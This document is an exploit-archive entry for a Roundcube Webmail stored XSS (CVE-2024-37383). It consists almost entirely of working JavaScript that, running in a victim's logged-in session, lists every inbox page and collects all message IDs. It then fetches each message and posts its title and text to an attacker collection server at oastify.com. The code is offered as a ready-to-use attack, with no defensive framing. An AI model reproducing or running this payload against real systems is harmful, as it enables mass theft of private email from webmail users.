@@ -1,0 +1,166 @@
+id: 39822
+date: 11/27/2024
+title: Roundcube Webmail Stored XSS Exploit
+author: AmirZargham
+cves: CVE-2024-37383
+
+EXPLOIT Code:
+
+// Configuration variables
+var target = 'https://webmail.redacted.tld';
+var attackerserver = 'https://oastify.com';
+
+function getPageCount(url) {
+    var req = new XMLHttpRequest();
+
+    // Configure the request with credentials
+    req.open('GET', url, true);
+    req.withCredentials = true;
+
+    // Define the response handler
+    req.onload = function() {
+        if (req.status === 200) {
+            try {
+                // Parse the response as JSON
+                let jsonResponse = JSON.parse(req.responseText);
+
+                // Access the pagecount field
+                let pageCount = jsonResponse.env.pagecount;
+
+                if (pageCount !== undefined) {
+                    // Array to store all message IDs
+                    let allMessageIds = [];
+                    let completedRequests = 0; // Track the number of completed requests
+
+                    // Loop to request each page
+                    for (let page = 1; page <= pageCount; page++) {
+                        (function(currentPage) {
+                            var pageReq = new XMLHttpRequest();
+                            // Construct the URL with the current page number
+                            var paginatedUrl = `${url}&_page=${currentPage}`;
+
+                            // Configure the request
+                            pageReq.open('GET', paginatedUrl, true);
+                            pageReq.withCredentials = true;
+
+                            // Define the response handler for each page
+                            pageReq.onload = function() {
+                                if (pageReq.status === 200) {
+                                    try {
+                                        // Get the response text
+                                        let responseText = pageReq.responseText;
+
+                                        // Use a regex to find all instances of this.add_message_row(NUMBER)
+                                        let messageRowRegex = /this\.add_message_row\((\d+)/g;
+                                        let matches;
+
+                                        // Find all matches and extract the numbers
+                                        while ((matches = messageRowRegex.exec(responseText)) !== null) {
+                                            allMessageIds.push(matches[1]);
+                                        }
+
+                                    } catch (error) {
+                                        // Error handling for page processing
+                                    }
+                                }
+                                completedRequests++; // Increment completed request count
+                                // Check if all requests are completed
+                                if (completedRequests === pageCount) {
+                                    // Loop through all message IDs and create URLs using each one
+                                    allMessageIds.forEach(id => {
+                                        // Construct a new URL with the current message ID
+                                        const newUrl = `${target}/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=${id}&_mbox=INBOX&_framed=1&_action=preview`;
+
+                                        // Make a request for each constructed URL
+                                        (function(currentUrl) {
+                                            var messageReq = new XMLHttpRequest();
+                                            messageReq.open('GET', currentUrl, true);
+                                            messageReq.withCredentials = true;
+
+                                            // Define the response handler for the message request
+                                            messageReq.onload = function() {
+                                                if (messageReq.status === 200) {
+                                                    // Get the response text
+                                                    let messageResponseText = messageReq.responseText;
+
+                                                    // Extract <title> content using regex
+                                                    let titleMatch = messageResponseText.match(/<title>(.*?)<\/title>/);
+                                                    let title = titleMatch ? titleMatch[1] : "No Title";
+
+                                                    // Use regex to extract the main message content
+                                                    var regex = /<!-- html ignored --><!-- head ignored --><!-- meta ignored -->([\s\S]*?)<\/div>/g;
+                                                    let messageMatches;
+                                                    while ((messageMatches = regex.exec(messageResponseText)) !== null) {
+                                                        // Clean HTML tags from the message content
+                                                        let cleanMessage = messageMatches[1].replace(/<\/?[^>]+(>|$)/g, ""); // Remove HTML tags
+
+                                                        // Send the cleaned message and title to the user via POST request
+                                                        sendMessageToUser(cleanMessage.trim(), title);
+                                                    }
+                                                }
+                                            };
+
+                                            // Handle network errors for message request
+                                            messageReq.onerror = function() {
+                                                // Error handling for message request
+                                            };
+
+                                            // Send the request for the current message URL
+                                            messageReq.send();
+                                        })(newUrl);
+                                    });
+                                }
+                            };
+
+                            // Handle network errors for page request
+                            pageReq.onerror = function() {
+                                completedRequests++; // Increment completed request count even on error
+                            };
+
+                            // Send the request for the current page
+                            pageReq.send();
+                        })(page);
+                    }
+                }
+            } catch (error) {
+                // Error handling for JSON parsing
+            }
+        }
+    };
+
+    // Handle network errors for initial request
+    req.onerror = function() {
+        // Error handling for initial request
+    };
+
+    // Send the request
+    req.send();
+}
+
+// Function to send cleaned message and title to the specified user via POST request
+function sendMessageToUser(message, title) {
+    var postReq = new XMLHttpRequest();
+    postReq.open('POST', attackerserver, true);
+    postReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+    // Define the response handler for the POST request
+    postReq.onload = function() {
+        // Response handler for successful send
+    };
+
+    // Handle network errors for sending message
+    postReq.onerror = function() {
+        // Error handling for message send
+    };
+
+    // Send the POST request with the URL-encoded title and message content
+    postReq.send(`title=${encodeURIComponent(title)}&message=${encodeURIComponent(message)}`);
+}
+
+// Usage
+var url = `${target}/?_task=mail&_action=list&_layout=widescreen&_mbox=INBOX&_page=1&_remote=1&_unlock=loading1730525119718&_=1730525069360`;
+getPageCount(url);
+
+
+
+#  0day.today [2024-12-04]  #
